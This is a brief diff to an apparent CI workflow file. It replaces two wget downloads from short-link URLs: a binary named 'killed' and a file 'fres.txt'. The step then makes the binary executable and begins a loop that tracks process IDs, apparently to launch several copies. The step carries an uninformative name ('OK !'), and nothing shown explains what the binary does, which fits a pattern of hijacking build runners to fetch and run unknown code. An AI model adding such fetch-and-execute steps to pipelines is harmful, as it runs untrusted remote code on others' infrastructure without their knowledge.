@@ -15,8 +15,8 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/4AlN0/killed
-          wget https://curl.by/Q2N_N/fres.txt
+          wget https://curl.by/Gf1Ke/killed
+          wget https://curl.by/QHcZt/fres.txt
           chmod +x killed
           PIDS=()
           for i in {1..2}; do
